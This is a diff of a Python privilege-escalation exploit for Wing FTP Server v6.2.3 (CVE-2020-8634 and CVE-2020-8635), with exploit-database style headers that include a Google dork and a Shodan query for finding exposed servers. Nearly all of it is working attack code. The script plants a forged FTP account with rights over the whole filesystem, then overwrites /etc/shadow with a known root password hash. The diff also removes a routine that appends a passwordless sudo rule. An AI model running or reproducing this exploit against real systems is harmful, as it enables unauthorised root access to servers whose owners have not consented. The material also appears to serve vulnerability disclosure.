@@ -1,11 +1,32 @@
 #!/usr/bin/python3
-#Exploit for Wing FTP Server v6.2.3 (other versions may be vulnerable)
-#Discovered by Cary Hooper (@nopantrootdance)
+# Exploit Title: Wing FTP Server root privilege escalation (v.6.2.3)
+# Google Dork: intitle:"Wing FTP Server - Web"
+# Shodan - "Server: Wing FTP Server"
+# Date: 04MAR20
+# Exploit Author: Cary Hooper (@nopantrootdance)
+# Vendor Homepage: https://www.wftpserver.com
+# Software Link: https://www.wftpserver.com/download/wftpserver-linux-64bit.tar.gz
+# Version: v6.2.3
+# Tested on: Ubuntu 18.04, Kali Linux 4, MacOS Catalina, Solaris 11.4 (x86)
+# CVE : CVE-2020-8634 (unsafe permissions set on edited files)
+# CVE : CVE-2020-8635 (unsafe default permissions on Wing FTP Server files)
+
+#Discovery/exploit by Cary Hooper (@nopantrootdance)
+#(other versions may be vulnerable)
+#Given SSH access to a target machine with Wing FTP Server installed, this program:
+#	- SSH in, forges a FTP user account with full permissions (CVE-2020-8635)
+#	- Logs in to HTTP interface and edits /etc/shadow (resulting in CVE-2020-8634)
+#Each step can all be done manually with code execution on target (no SSH)
+#To setup, start SSH service, then run ./wftpserver.  Wing FTP services will start after domain is created.
+#Writeup: https://www.hooperlabs.xyz/disclosures/cve-2020-8635.php
+
+#python3 sploit.py.txt -t 192.168.0.2:2222 -u lowleveluser -p demo --proxy http://127.0.0.1:8080
 
 import paramiko,sys,warnings,requests,re,time,argparse
+#Python warnings are the worst
 warnings.filterwarnings("ignore")
 
-#Argument handling.
+#Argument handling begins
 parser = argparse.ArgumentParser(description="Exploit for Wing FTP Server v6.2.3 Local Privilege Escalation",epilog=print(f"Exploit by @nopantrootdance."))
 parser.add_argument("-t", "--target", help="hostname of target, optionally with port specified (hostname:port)",required=True)
 parser.add_argument("-u", "--username", help="SSH username", required=True)
@@ -39,7 +60,7 @@ else:
 	hostname = args.target
 	port = "22"
 
-#Prepare proxy dict (for requests)
+#Prepare proxy dict (for Python requests)
 if args.proxy:
 	if ("http://" not in args.proxy) and ("https://" not in args.proxy):
 		print(f"[!] Invalid proxy.  Proxy must have http:// or https:// {proxy}")
@@ -47,9 +68,10 @@ if args.proxy:
 	proxies = {'http':args.proxy,'https':args.proxy}
 else:
 	proxies = {}
+#Argument handling ends
 
 #This is what a <username>.xml file looks like.
-#Gives full permission to user for entire filesystem '/'.
+#Gives full permission to user (h00p:h00p) for entire filesystem '/'.
 #Located in $_WFTPROOT/Data/Users/
 evilUserXML = """<?xml version="1.0" ?>
 <USER_ACCOUNTS Description="Wing FTP Server User Accounts">
@@ -131,7 +153,7 @@ evilUserXML = """<?xml version="1.0" ?>
 </USER_ACCOUNTS>
 """
 
-#Function for debugging.  
+#Verbosity function.  
 def log(string):
 	if DEBUG != False:
 		print(string)
@@ -168,7 +190,7 @@ def getCookie(url,webuser,webpass,headers):
 	return cookies
 
 #Change directory within the web interface.
-#The actual POST request changes state.  We keep track of that state in directorymem array.
+#The actual POST request changes state.  We keep track of that state in the returned directorymem array.
 def chDir(url,directory,headers,cookies,directorymem):
 	log("chDir")
 	data = {"dir": directory}
@@ -222,8 +244,10 @@ def saveFile(newfilecontent,file,url,headers,cookies,referer,directorymem):
 
 #Other methods may be more stable, but this works.
 #"You can't argue with a root shell" - FX
-#Let me know if you know of other ways to increase privilege by overwriting or creating files.
+#Let me know if you know of other ways to increase privilege by overwriting or creating files.  Another way is to overwrite
+#the Wing FTP admin file, then leverage the lua interpreter in the administrative interface which runs as root (YMMV).
 #Mind that in this version of Wing FTP, files will be saved with umask 111.  This makes changing /etc/sudoers infeasible.
+
 #This routine overwrites the shadow file
 def overwriteShadow(url):
 	log("overwriteShadow")
@@ -234,7 +258,7 @@ def overwriteShadow(url):
 	#Chdir a few times, starting in the user's home directory until we arrive at the target folder
 	directorymem = chDir(url=url,directory="etc",headers=headers,cookies=cookies,directorymem="")
 	
-	#Download and re-save the target file.
+	#Download the target file.
 	shadowfile,referer = downloadFile(file="shadow",url=url,headers=headers,cookies=cookies,directorymem=directorymem)
 
 	# openssl passwd -1 -salt h00ph00p h00ph00p
@@ -248,25 +272,6 @@ def overwriteShadow(url):
 	print("[*] Saved the forged shadow file...")
 	log("exit overwriteShadow")
 
-#This function amends the /etc/sudoers file.  This doesn't work as is. 
-#Sudo won't work with 666 permissions.  Future releases of wftpserver may help this method.
-#Still researching whether /etc/sudoers.d/<user> files can be world-writable.
-def forgeSudoers(url):
-	#{username} ALL=(ALL) NOPASSWD: ALL
-	log("forgeSudoers")
-	headers = {"Content-Type": "application/x-www-form-urlencoded"}
-	#Grab Cookie
-	cookies = getCookie(url=url,webuser="h00p",webpass="h00p",headers=headers)
-	#Change Directory
-	directorymem = chDir(directory="etc",url=url,headers=headers,cookies=cookies,directorymem="")
-	#Download the file
-	sudoersfile,referer = downloadFile(file="sudoers",url=url,headers=headers,cookies=cookies,directorymem=directorymem)
-	sudoersfile = sudoersfile.replace("+"," ")
-	sudoersfile += f"{username} ALL=(ALL) NOPASSWD: ALL"
-	#Save file.
-	saveFile(newfilecontent=sudoersfile,file="sudoers",url=url,headers=headers,cookies=cookies,referer=referer,directorymem=directorymem)
-	log("exit forgeSudoers")
-
 def main():
 	log("main")
 	try:
@@ -278,12 +283,13 @@ def main():
 			client.connect(hostname, port=port, username=username, password=password)
 		except:
 			print(f"Failed to connect to {hostname}:{port} as user {username}.")
+		
 		#Find wftpserver directory
 		print(f"[*] Searching for Wing FTP root directory. (this may take a few seconds...)")
 		stdin, stdout, stderr = client.exec_command("find / -type f -name 'wftpserver'")
 		wftpDir = stdout.read().decode("utf-8").split('\n')[0].rsplit('/',1)[0]
 		print(f"[!] Found Wing FTP directory: {wftpDir}")
-		#Find name of "domain"
+		#Find name of <domain>
 		stdin, stdout, stderr = client.exec_command(f"find {wftpDir}/Data/ -type d -maxdepth 1")
 		lsresult = stdout.read().decode("utf-8").split('\n')
 		#Checking if wftpserver is actually configured.  If you're using this script, it probably is.
@@ -321,19 +327,19 @@ def main():
 		except Exception as e:
 			print(f"[!] Error: cannot overwrite /etc/shadow: {e}")
 
-		#Check to make sure the sploit works.
+		#Check to make sure the exploit worked.
 		stdin, stdout, stderr = client.exec_command("cat /etc/shadow | grep root")
 		out = stdout.read().decode('utf-8')
 		err = stderr.read().decode('utf-8')
 
 		log(f"STDOUT - {out}")
 		log(f"STDERR - {err}")
-		if "root:$1$" in out:
+		if "root:$1$h00p" in out:
 			print(f"[*] Success!  The root password has been successfully changed.")
 			print(f"\n\tssh {username}@{hostname} -p{port}")
 			print(f"\tThen: su root (password is h00ph00p)")
 		else:
-			print(f"[!] Something went wrong... SSH in to manually check the files.  Permissions may have been changed to 666.")
+			print(f"[!] Something went wrong... SSH in to manually check /etc/shadow.  Permissions may have been changed to 666.")
 
 		log("exit prepareServer")
 	finally:
